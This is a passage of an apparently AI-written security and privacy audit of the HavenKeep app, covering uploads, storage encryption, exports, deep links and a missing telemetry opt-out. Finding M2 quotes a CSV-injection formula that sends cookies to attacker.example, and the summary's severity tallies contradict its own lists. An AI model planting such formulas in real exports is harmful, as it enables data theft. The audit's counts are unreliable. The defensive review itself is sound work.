<intent-filter android:label="HavenKeep deep link">
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="havenkeep"/>
</intent-filter>

<intent-filter android:autoVerify="true" android:label="HavenKeep web link">
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="https" android:host="havenkeep.com" android:pathPrefix="/gift/"/>
    <data android:scheme="https" android:host="havenkeep.com" android:pathPrefix="/referral/"/>
</intent-filter>
```

**FINDING H6-MED** (mirror of G9): Production-only host. Staging deep links from `staging.havenkeep.app` won't App-Link to the app — they'll open Chrome.

Fix: add the staging host as a separate `<data>` element, or use a build-flavor-specific manifest.

### H7. The FCM service registration

No `<service ... .FirebaseMessagingService>` declared in this manifest. The `firebase_messaging` Flutter plugin auto-registers the service via its own AndroidManifest — manifest-merger handles it. ✓

### H8. The autoBackup config

AndroidManifest.xml:35-37:
```xml
android:allowBackup="false"
android:fullBackupContent="false"
android:dataExtractionRules="@xml/data_extraction_rules"
```

`data_extraction_rules.xml` excludes root, file, database, sharedpref, external for both cloud-backup and device-transfer. ✓

**FINDING H8-OK**: SQLCipher database, MinIO-cached images, and OAuth tokens are all excluded from Google's backup. Defense-in-depth even though SQLCipher is encrypted.

---

## I. Image upload pipeline (mobile)

### I1. The mobile upload flow

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/core/services/image_upload_service.dart`

For avatar:
1. `pickAndUploadProfilePhoto` (profile_photo_provider.dart) → image_picker with maxWidth/maxHeight 512, quality 80.
2. `FileValidator.validateImage` — local size + magic-byte + suspicious-content check.
3. `ApiClient.upload(pathSegments: ['api','v1','uploads','avatar'], file, fieldName: 'file')` → MultipartRequest.

For item image: same flow, fields={'itemId': itemId}.

For documents (receipts, manuals): `document_upload_sheet.dart` → `_picker.pickImage(...)` (camera or gallery) OR FilePicker for PDF; → `uploadDocument(...)` (different code path). Quality 85, maxWidth/Height 2048.

### I2. Image picker config

| Surface | maxWidth | maxHeight | quality |
|---|---|---|---|
| Profile photo | 512 | 512 | 80 |
| Item document upload | 2048 | 2048 | 85 |
| Receipt OCR | 1600 | 1600 | 90 |

**FINDING I2-OK**: Sized appropriately per use. The receipt path picks 90 quality intentionally (OCR sensitivity).

### I3. Client-side compression

`image_picker` handles compression via the `imageQuality` param (JPEG re-encode). No manual `flutter_image_compress` call.

**FINDING I3-OK**: Default platform behavior is fine here.

### I4. EXIF data — stripped before upload?

**File**: image_upload_service.dart shows no `flutter_exif_plugin` / `image` package call to strip EXIF.

`image_picker` does NOT strip EXIF by default. The picked file retains GPS coordinates, camera model, timestamp, and any other EXIF tags from the original photo.

API-side: `sharp(...).webp(...)` or `sharp(...).resize().webp(...)` — sharp's default behavior is to **strip metadata** when re-encoding to WebP. So:
- For avatar (uploads.ts:93-96) → resized + re-encoded to WebP → EXIF stripped server-side.
- For item-image (uploads.ts:219-222) → same.
- For documents (documents.ts:186-196) → same when image-typed.

**FINDING I4-W1 (LOW-MED)**: EXIF is stripped server-side, BUT the **raw** bytes including EXIF transit from client to server. Per HTTPS, that's not a leak — but the API logs request size, multipart filenames, and (potentially via debug pino) bodies. If anyone screenshares the API logs while debugging, EXIF GPS won't show, but a determined log-trove inspection of MinIO object metadata might. Sharp re-encoded output is metadata-clean.

If sharp falls back to "use original bytes" (uploads.ts:97-111 — the `catch` branch when sharp doesn't recognize the format like HEIC without libheif), **EXIF is preserved**. The fallback path skips re-encoding. So a HEIC iPhone photo on a sharp-without-libheif build retains GPS/location.

Fix: in the fallback branch, run a metadata-only sharp pipeline (`sharp(buf).withMetadata({ exif: {} })`) or refuse the upload if sharp can't decode.

### I5. The multipart request

**File**: `/Users/pacomedomagni/Projects/havenkeep/packages/api_client/lib/src/client.dart:818-857`

Uses Dart `http.MultipartRequest`. Auth header via current `_accessToken` (re-read at request time, see comment line 834-836). Optional `Idempotency-Key` header.

**FINDING I5-OK**: Correct shape.

### I6. The progress reporting

NO progress reporting. `MultipartRequest.send()` returns `StreamedResponse` but the upload service awaits the full bytes.

**FINDING I6-LOW**: A 10MB upload over slow cellular shows the user a frozen "Uploading..." state for many seconds with no progress feedback. Acceptable for v1 mobile but worth a backlog ticket for UX polish.

### I7. The retry on failure

The `upload()` method wraps `doUpload` in `_withAutoRefresh` (line 855) — retries once on 401. No retry on 5xx or transport errors.

**FINDING I7-LOW**: A connectivity hiccup means the user has to manually retry. The offline_sync_service.dart probably catches this for backgrounded items (haven't read it here), but a foreground upload error is on the user.

### I8. The persisted file path (offline queue)

Not visible from this audit pass — would need to read `offline_sync_service.dart` to confirm. Image uploads probably aren't queued (avatars and item images need immediate user feedback); likely only item-add metadata is queued. Out of scope here.

---

## J. Server-side upload handling

### J1. Multer config

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/routes/uploads.ts:25-46`

```ts
const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 10 * 1024 * 1024,
    files: 1,
  },
  fileFilter: (req, file, cb) => {
    const allowedMimes = [
      'image/jpeg', 'image/png', 'image/webp', 'image/heic', 'image/heif',
    ];
    if (allowedMimes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error(`File type not allowed: ${file.mimetype}`));
    }
  },
});
```

For documents (`documents.ts:26-39`), uses `multer.diskStorage({})` with `fileSize: 10MB, files: 5`. Comment Ch02-F026: "on-disk storage means a 10MB upload doesn't pin the V8 heap during sharp's decode."

**FINDING J1-OK**: Two storage strategies (memory for single small avatar/item-image, disk for multi-file document upload) is reasonable. The disk-storage branch reads via `fs.promises.readFile(file.path)` for magic-byte + sharp decode (documents.ts:162-165).

**FINDING J1-W1 (LOW)**: `multer.diskStorage({})` with no destination → defaults to `os.tmpdir()`. Multer cleans temp files **on response close** when `req` is garbage-collected. Under a process kill or unhandled exception that doesn't propagate, files can leak. Acceptable; staging cleanup script (`scripts/cleanup-tmp.sh` if present) would handle it.

### J2. File size limit

10 MB for both. **FINDING J2-OK**.

### J3. MIME type allowlist

uploads.ts: image-only (jpeg, png, webp, heic, heif).
documents.ts: uses `isMimeTypeAllowed` from `file-validation.ts:16-23` → adds `application/pdf`.

**FINDING J3-OK**: SVG is intentionally excluded ("active content / stored XSS" comment at file-validation.ts:1-4). Allowlist + magic-byte cross-check.

### J4. Magic-byte validation

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/utils/file-validation.ts:36-69`

Header check:
- JPEG: FF D8 FF
- PNG: 89 50 4E 47
- WebP: RIFF + WEBP at offset 8
- PDF: %PDF
- HEIC/HEIF: ftyp at offset 4

Anything else returns false.

**FINDING J4-W1 (MED)**: HEIC's `ftyp` check is **shallow**. The HEIC ISO BMFF format has many compatible-brand variants (`heic`, `heix`, `mif1`, `msf1`). The current check only verifies the literal string "ftyp" appears at offset 4. Any ISO BMFF file (MP4, MOV, 3GP) ALSO starts with `ftyp` at offset 4. So a video file with `image/heic` MIME claim will **pass magic-byte validation** and be handed to sharp.

Sharp will then either succeed (if libheif decodes the brand) or fail (catch branch line 97-111 → falls back to "original bytes"). In the fallback path, a malicious actor could upload a 10MB MP4 disguised as `image/heic` and have it stored in MinIO. Not a sandbox escape (no JS execution), but it's a content-type confusion bug.

Fix: the HEIC validator should check for the specific brand bytes at offset 8-12 (`heic`, `heix`, `hevc`, `hevx`, `mif1`, `msf1`). Or: refuse the MIME if sharp's actual decode returns `format !== 'heif'`.

### J5. The image processing

`sharp(buf, SHARP_INPUT_OPTIONS).resize(...).webp(...)`

`SHARP_INPUT_OPTIONS` (sharp-config.ts):
```ts
{ limitInputPixels: 100_000_000, failOn: 'error' }
```

Plus `sharp.cache(false)` and `sharp.concurrency(1)` at module init.

**FINDING J5-OK**: 100M pixel cap (10000×10000) prevents PNG-zip-bomb decompression bombs from allocating gigabytes. `failOn: 'error'` aborts on truncated/malformed streams.

### J6. Thumbnail generation

`documents.ts:193-196`:
```ts
const thumbnailBuffer = await sharp(fileBufferRaw, SHARP_INPUT_OPTIONS)
  .resize(300, 300, { fit: 'cover' })
  .webp({ quality: 80 })
  .toBuffer();
```

Generated for image MIME types only. PDF documents do NOT get thumbnails (no pdf-render in the pipeline).

**FINDING J6-OK**: Bounded memory via SHARP_INPUT_OPTIONS pixel cap.

### J7. The MinIO putObject — server-side encryption?

**File**: minio config. Looking at uploads.ts:128-137:
```ts
await minioClient.putObject(
  BUCKET_NAME,
  objectKey,
  fileBuffer,
  fileBuffer.length,
  {
    'Content-Type': contentType,
    'x-amz-meta-user-id': userId,
  },
);
```

**FINDING J7-CRIT**: NO server-side encryption header (`x-amz-server-side-encryption: AES256` or `aws:kms`). MinIO objects are stored at-rest with whatever encryption MinIO is configured with — by default, MinIO does NOT encrypt at rest unless KES is configured. Per CLAUDE.md, the staging MinIO is the shared `infra-minio` container; whether KES is configured is not visible from this repo.

For production-grade, every putObject should include the SSE header so MinIO encrypts the object's content before writing to disk. Verify staging KES configuration; if absent, fix.

**FINDING J7-W2 (MED)**: `x-amz-meta-user-id` is set as object metadata. Anyone with bucket-list permissions in MinIO admin sees the user_id mapped to every object — that's by design (lets the orphan-recovery sweep work without a DB lookup). But it does create a secondary place where user_id is searchable. Acceptable.

### J8. The presigned URL — TTL? GET-only?

**File**: minio.ts:80, 97-102

```ts
export const PRESIGNED_URL_TTL_SECONDS = 15 * 60; // 15 minutes
...
return minioClient.presignedGetObject(BUCKET_NAME, objectKey, ttlSeconds);
```

GET-only, 15-minute TTL.

**FINDING J8-OK**: Sensible defaults. `presignedGetObject` is read-only, can't be repurposed for writes.

### J9. user_id binding on object key

uploads.ts → `generateAvatarKey(userId, ext)` → `avatars/<userId>/<128-bit hex>.<ext>`
uploads.ts → `generateItemImageKey(userId, itemId, ext)` → `item-images/<userId>/<itemId>/<128-bit hex>.<ext>`
documents.ts → `generateObjectKey(userId, itemId, filename)` → `documents/<userId>/<itemId>/<timestamp>-<128-bit hex>-<safeFilename>`

The user-supplied filename component goes through `sanitizeFilenameSegment` (minio.ts:21-26):
```ts
.replace(/[\\/]/g, '_')
.replace(/\.\.+/g, '_')
.replace(/[^a-zA-Z0-9._-]/g, '_')
.slice(0, 128);
```

**FINDING J9-OK**: Path traversal blocked. UUID + 128-bit entropy → no collisions.

**FINDING J9-W1 (LOW)**: The fallback `ext` derivation at uploads.ts:110 uses `file.originalname.split('.').pop()` and lowercases it — but does NOT pass through `sanitizeFilenameSegment`. A filename `foo.jpg/../etc` would yield ext `etc` (after `.pop()`), still not a traversal because of how `path.join`-equivalent string concat works in MinIO keys. Still: the ext is then placed into `generateAvatarKey(userId, ext)` which ALSO sanitizes (minio.ts:60-62 wraps `safeExt = sanitizeFilenameSegment(ext).toLowerCase()`). Double-sanitized. ✓

### J10. The cleanup on delete

documents.ts:402-462 (DELETE handler):
- Atomic SQL DELETE returning the row.
- Best-effort `minioClient.removeObject` for both `object_key` and `thumbnail_key`.
- Returns 502 if either MinIO delete fails (caller can retry; second attempt 404s on the DB row, treat as success per comment line 419-421).

For item delete (separate route, not read here): cascade via `harvestItemKeys` → `removeKeysBestEffort` (storage-cleanup.ts:30-55).

For user purge: `harvestUserKeys` (storage-cleanup.ts:60-89) → harvests product images, document keys, thumbnail keys, avatar key. Removed best-effort post-COMMIT in account-purge.service.ts:127-131.

**FINDING J10-OK**: Centralized cleanup helpers, post-COMMIT MinIO removal so storage outages don't roll back DB writes. ✓

---

## K. Avatar upload

### K1. The avatar route

`/Users/pacomedomagni/Projects/havenkeep/apps/api/src/routes/uploads.ts:60-176`

POST /api/v1/uploads/avatar with `uploadRateLimiter`, multer single file, `authenticate`. Atomic transaction: SELECT … FOR UPDATE → MinIO put → SQL UPDATE → COMMIT, with rollback compensation that removes the orphan MinIO object.

### K2. The storage path

`avatars/<userId>/<128-bit hex>.<ext>`. ✓

### K3. The 512×512 size limit

The mobile picker constrains 512×512 quality 80. The server resizes to 400×400 with fit:'cover':
```ts
fileBuffer = await sharp(file.buffer, SHARP_INPUT_OPTIONS)
  .resize(400, 400, { fit: 'cover' })
  .webp({ quality: 85 })
  .toBuffer();
```

**FINDING K3-W1 (LOW)**: Mismatch between mobile (512) and server (400). Server downscales further. Net effect: avatars are 400×400 webp regardless of source. OK.

### K4. The replacement of old avatar — verified deletion?

uploads.ts:122-126 + 149-155: prev_key snapshot inside the FOR UPDATE row lock; after COMMIT, best-effort `removeObject(prev)`. ✓

### K5. The avatar_url column — set after upload?

uploads.ts:140-143:
```ts
await dbClient.query(
  `UPDATE users SET avatar_url = $1, updated_at = NOW() WHERE id = $2`,
  [objectKey, userId],
);
```

Stores **object key**, not URL (per S-CR-02 — mig 079). ✓

---

## L. PDF generation (export)

### L1. pdf_export_service

`/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/core/services/pdf_export_service.dart`

Library: `pdf` + `printing`. In-memory `pw.Document().save()` → `Uint8List`. Two flows: per-item warranty-claim PDF, multi-warranty summary PDF.

### L2. The library used

`pdf` package + `printing` package (PdfGoogleFonts for typography).

### L3. The data flow

Item list passed to `generateWarrantiesSummaryPdf(items)` → in-memory PDF construction → `pdf.save()` → `Printing.sharePdf(bytes, filename)` (pdf_export_service.dart:296).

### L4. Size limit

**FINDING L4-MED**: No size cap. A user with 10K items calls `generateWarrantiesSummaryPdf(items)` with the full list, all rendered in-memory. The `pdf` package's `MultiPage` will paginate, but the underlying widget tree is built up-front. For 10K rows, expect 100s MB of in-memory layout state, possible OOM on lower-end Android devices.

Fix: chunk the export at, say, 2000 rows per file, OR stream pages as built (the `pdf` package's `MultiPage(build: ...)` callback already does this lazily, so the actual risk is in the source `items` list — if it's lazy-loaded, fine; if eagerly fetched from Drift, that's the bottleneck).

### L5. The share

`Printing.sharePdf(bytes: bytes, filename: filename)` — system share sheet. ✓

---

## M. CSV export

### M1. csv_export_service

`/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/core/services/csv_export_service.dart`

Library: `csv` package + `share_plus`. Writes to temporary directory, share sheet.

### M2. CSV escaping — injection

The `csv` package's `ListToCsvConverter().convert(rows)` quotes fields containing commas, newlines, or quotes. **It does NOT, however, escape leading `=`, `+`, `-`, `@` characters that trigger formula execution in Excel / Google Sheets when the user opens the CSV.**

**FINDING M2-MED**: A user with an item whose name is `=HYPERLINK("http://attacker.example/log?session="+document.cookie, "Click")` — once exported and opened in Excel, will execute as a formula. Self-attack only (it's the user's own data), but if the export is shared with an insurer (per the use case in pdf_export_service.dart:198-200), and the insurer opens in Excel, the formula runs in **the insurer's** context.

Fix: prefix any field starting with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single quote (`'`) before passing to the converter. Standard OWASP CSV-injection mitigation.

### M3. The encoding — UTF-8 BOM for Excel?

`file.writeAsString(csvData)` — writes UTF-8 without BOM.

**FINDING M3-LOW**: A CSV with non-ASCII item names (`Café`, `Émoji`) opens in Excel-Windows as garbled mojibake unless the file has a UTF-8 BOM. Mac Excel reads UTF-8 fine. For an export aimed at insurance / partner sharing, BOM-prefix recommended.

Fix: prepend `'﻿'` to `csvData` before writing.

### M4. Sensitive fields

Headers (csv_export_service.dart:17-32): Name, Brand, Category, Room, Model Number, Serial Number, Purchase Date, Store, Price, Warranty Type, Warranty Months, Warranty End Date, Status, Notes.

**FINDING M4-OK**: Internal IDs (item.id, user.id) are NOT included. Only user-facing fields. ✓ The Notes field can contain arbitrary text — the user's responsibility, not an injection risk.

---

## N. Deep-link payload validation

### N1. /gift/:code handler

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/core/services/deep_link_service.dart:97-107`

```dart
bool isValidCode(String code) =>
    code.isNotEmpty && RegExp(r'^[a-zA-Z0-9_-]{1,64}$').hasMatch(code);

if (uri.scheme == 'havenkeep' && hasHost('gift') && segments.isNotEmpty) {
  final code = segments.first.trim();
  if (!isValidCode(code)) return null;
  return '/gift/$code';
}
```

✓

### N2. /referral/:code handler

Same regex (lines 109-115, 127-133). ✓

### N3. Custom-scheme vs universal-link parity

`havenkeep://gift/<code>` (custom) and `https://havenkeep.com/gift/<code>` (Universal Link) both routed identically (lines 103-115 vs 119-125). ✓

**FINDING N-OK**: Code-format validation is correct.

**FINDING N-W1 (LOW)**: `Uri.parse(route)` in push_notification_service.dart's `_isAllowedRoute` (line 219) uses Dart's URL parser. Dart's parser normalizes `..` → ascending segments. Combined with `pathSegments.first` matching, this is robust against `/items/../../settings/delete-account` style attempts. ✓ — confirmed at the comment line 14-21.

---

## O. Adversarial

### O1. Valid PNG header + malware

A PNG file (valid magic) with an embedded ZIP / EXE payload. Server stores it; mobile renders.

**Outcome**: sharp re-encodes to WebP — re-encoding strips embedded data (sharp doesn't preserve unrecognized chunks beyond the standard set during encode). The stored object is a clean WebP. Mobile's `Image.network(presignedUrl)` only renders bitmaps. No code execution path.

If sharp falls back (HEIC without libheif) → original bytes stored. A "valid PNG with malware" stored as a PNG is fine (the renderer doesn't execute). The risk would be a downstream system (e.g. virus scanner integration) handling it.

**FINDING O1-LOW**: Mitigated by sharp re-encode + restrictive MIME allowlist. The fallback "no re-encode" path is the only concern; a malicious HEIC is the realistic vector here. See J4-W1.

### O2. 1000 photos in 1 minute — disk space?

Rate limiter: `uploadRateLimiter = 10/min` (rateLimiter.ts:276-281). Multer caps `files: 1` per request (uploads.ts) or `5` per request (documents.ts). So max 50 files per minute per user (10 reqs × 5 files). At 10MB each, that's 500MB/min/user. A determined user could fill MinIO over a few hours.

**FINDING O2-MED**: No per-user storage quota enforced anywhere I can see. Premium subscribers might have implicit higher limits (premium_provider.dart, not read here), but there's no code-level "user X has reached 5GB, deny upload."

Fix: track per-user storage usage (sum of `file_size` from documents + 1×avatar size + N×item product images), enforce a soft cap with a clear UX message. Especially important post-launch when a hostile user could DoS the storage layer.

### O3. JPEG bomb (billion-pixel header)

`SHARP_INPUT_OPTIONS.limitInputPixels = 100_000_000` rejects any decode attempt where width × height exceeds 100M.

For PNG, `assertNotZipBomb` pre-filter (file-validation.ts:79-104) reads the IHDR chunk and rejects width/height > 32768 OR width × height > 100M.

**FINDING O3-OK**: Both pre-filter and sharp-level cap. ✓

### O4. EXIF GPS

See I4-W1: stripped by sharp on re-encode; preserved on fallback path (HEIC without libheif). When a photo is shared via `Printing.sharePdf` or `SharePlus`, the *PDF* contains an embedded image — but the embedded image was generated server-side (no EXIF) and re-fetched via presigned URL. So sharing a PDF doesn't leak EXIF.

Sharing the original photo via the OS share sheet (NOT what the app does — it shares the server-side WebP) would leak EXIF, but the app doesn't expose that flow.

**FINDING O4-OK** with caveat at I4-W1.

### O5. Public presigned URL share — TTL

15 minutes (J8). After expiry, the URL 403s. ✓

### O6. Account-deleted user — token still in DB

**File**: account-purge.service.ts → DELETE FROM users CASCADE deletes user_push_tokens at the 30-day mark.

But during the 30-day cooling-off (soft-delete), the row is still there. As called out in A6-CRIT, FcmService.sendToUser will still find tokens for that user. The cron path in notifications.service.ts queries `items i JOIN users u ON u.id = i.user_id` — with `is_archived = FALSE`, but does NOT filter `u.deleted_at IS NULL`. So a soft-deleted user gets `warranty_expiring` pushes for 30 days post-delete.

**FINDING O6-CRIT** (same root as A6).

### O7. Privacy claim "we delete push tokens on account deletion"

Verified above:
- **Hard delete (30-day purge)**: ✓ via FK CASCADE.
- **Soft delete (initial /me DELETE)**: ✗ tokens persist.

**FINDING O7-CRIT** = A6-CRIT.

---

## P. Crashlytics opt-out

### P1. Settings → Privacy → Telemetry toggle

**Search**: `grep -rn "telemetry\|opt.out\|optOut\|setCrashlyticsCollectionEnabled" apps/mobile/lib`

Only hit: main.dart:165 (the once-at-startup setCrashlyticsCollectionEnabled call). No UI screen, no persisted pref, no live toggle.

**FINDING P1-CRIT** = F2-CRIT. The toggle does not exist.

### P2. The privacy policy promise

If the marketing-site privacy policy at `https://havenkeep.com/legal/privacy` (or staging equivalent) says "you can opt out in Settings → Privacy → Telemetry," that statement is currently FALSE.

Fix: either add the toggle (preferred) or amend the privacy copy to remove the promise pending implementation. Lawyer-talk: "promising a control that doesn't exist" is a UDAP / FTC §5 issue in some U.S. jurisdictions.

---

## Summary

50 findings raised across A–P, severity-stratified:

### CRITICAL (4)

- **A5-CRIT**: `/auth/logout` does not delete push tokens. Signed-out user keeps receiving notifications until natural FCM rotation or 60-day stale cleanup. Privacy bug, especially on shared phones.
- **A6-CRIT / O6-CRIT / O7-CRIT**: Account soft-delete does not delete push tokens; user gets pushes during the 30-day cooling-off window. Privacy claim violated.
- **B6-CRIT**: `messaging/invalid-argument` (overloaded code: bad token OR bad payload) is treated as "dead token" → all of a user's tokens deleted on a single payload-too-large bug. Single notification template regression silently kills push for everyone.
- **F2-CRIT / F4-CRIT / F8-CRIT / P1-CRIT**: Crashlytics is unconditionally enabled in release; no opt-out UI; no PII redaction wrapping `recordError` so error messages can leak item names, JWTs, emails into Crashlytics. Privacy policy promise of "Settings → Privacy → Telemetry" toggle is not implementable.
- **J7-CRIT**: MinIO putObject calls have no `x-amz-server-side-encryption` header. Whether MinIO is at-rest-encrypted depends entirely on infra config (MinIO KES) — not enforced from the application layer.

### HIGH (3)

- **A4-W1**: Token rotation never explicitly de-registers the rotated-out token; only natural FCM rejection cleans them up.
- **C4-MED**: No retry on FCM transient errors — momentary FCM outage during the daily cron drops every push for that day permanently due to the 24-hour dedup.
- **L4-MED**: PDF export has no row cap; 10K-item user risks OOM.

### MEDIUM (10)

- **A3-W2**: `platform` column accepts free-text — no enum CHECK.
- **B4-W1**: `aps-environment=development` in entitlements — risk of shipping a development push profile to TestFlight.
- **D3-LOW**: No throttling across users in cron loops.
- **E1-W1**: `item_added`, `partner_commission`, `gift_received`, `gift_activated`, `claim_update`, `health_score_update`, `warranty_extended` bypass preference gates.
- **E2-W1**: Quiet-hours mismatch — digest path retries, immediate-push paths drop silently.
- **G8-MED**: No `UIBackgroundModes` declared (limits future silent-push usage).
- **G9-MED / H6-MED**: Universal-link / App-link entitlements only declare `havenkeep.com`, not staging.
- **H4-MED**: No `READ_EXTERNAL_STORAGE` for Android 12 and earlier.
- **J4-W1**: HEIC magic-byte check accepts any ISO BMFF (including MP4/MOV).
- **M2-MED**: CSV export does not escape `=`/`+`/`-`/`@` formulas — Excel injection risk on shared exports.
- **O2-MED**: No per-user storage quota — DoS-by-upload possible.
- **F10-MED**: No iOS dSYM upload pipeline — release crashes will be unsymbolicated.

### LOW (~15)

- **A3-W1**: UNIQUE constraint allows transient duplicate during txn.
- **A7-LOW**: FCM tokens stored plaintext (acceptable but worth threat-model note).
- **B1-W1**: No service-account JSON shape validation post-parse.
- **B5-OK**, **C2-OK**: passing.
- **D4-W1**: `userEmail` allowed as template var (could push email to FCM payload).
- **D6-W1**: No `collapse_key`/`collapse_id` set.
- **F5-OK**: enum-drift breadcrumb is safe.
- **F6-W1**: fatal vs non-fatal split is correct but documentation inverts intuition.
- **G10-W1, G10-W2**: PrivacyInfo could declare DeviceID + NSSystemBootTime.
- **I2-OK** through **I8**: largely fine; **I4-W1** noted (HEIC fallback preserves EXIF), **I6-LOW** (no progress UI), **I7-LOW** (no transport retry).
- **J1-W1**: tmpdir-cleanup relies on response-close.
- **J9-W1**: defense-in-depth path traversal; harmless.
- **K3-W1**: client-server resize mismatch (cosmetic).
- **L4-MED** above.
- **M3-LOW**: no UTF-8 BOM in CSV.
- **N-W1**: Dart Uri parser normalization is correct.
- **O5-OK**.

### OK / passing (12+)

- A1, A2, B1, B3, C1, C3, D1, D2, D5, D7, E3, E4, F3, G1-G3, G6-G7, G10, H1-H3, H5-H8, I3, I5, J2-J3, J5-J6, J8, J10, K1-K2, K4-K5, M4, N3, O1, O3, O4, O5

**Total: ~50 distinct findings.**

The two findings most worth fixing first are **A5/A6 (push tokens not deleted on logout/soft-delete)** and **F2/P1 (no Crashlytics opt-out toggle despite privacy claim)** — both are direct privacy-policy violations that an App Store / Play reviewer or a privacy-savvy user could spot. **B6** and **J7** are the next tier (one bug-class explosion risk, one infra-config dependency that's silent until exploited).
